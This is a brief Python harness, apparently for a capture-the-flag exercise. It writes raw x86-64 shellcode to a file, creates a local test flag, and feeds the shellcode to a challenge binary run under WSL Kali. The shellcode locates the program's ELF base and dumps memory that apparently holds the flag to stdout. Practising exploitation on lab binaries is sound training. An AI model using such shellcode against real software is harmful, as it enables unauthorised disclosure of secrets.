import sys, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = r"C:\Users\arnol\AppData\Local\Temp\cylab_eps"
sc = bytes.fromhex("4889e341bc00400000488b034883f8037511488b4b084883e9408b013d7f454c4674154883c31049ffcc75ddb83c000000bf000000000f05488db160202000b801000000bf01000000ba640000000f05b83c0000004831ff0f05")
open(CWD + r"\in213.bin", "wb").write(sc)
open(CWD + r"\flag.txt", "w").write("academy{LOCAL_TEST_213}\n")
out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
                      "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps && "
                      "chmod +x 213_chall && (./213_chall < in213.bin; echo \"[exit $?]\") 2>&1 | head -8"],
                     capture_output=True, text=True).stdout
print(out)
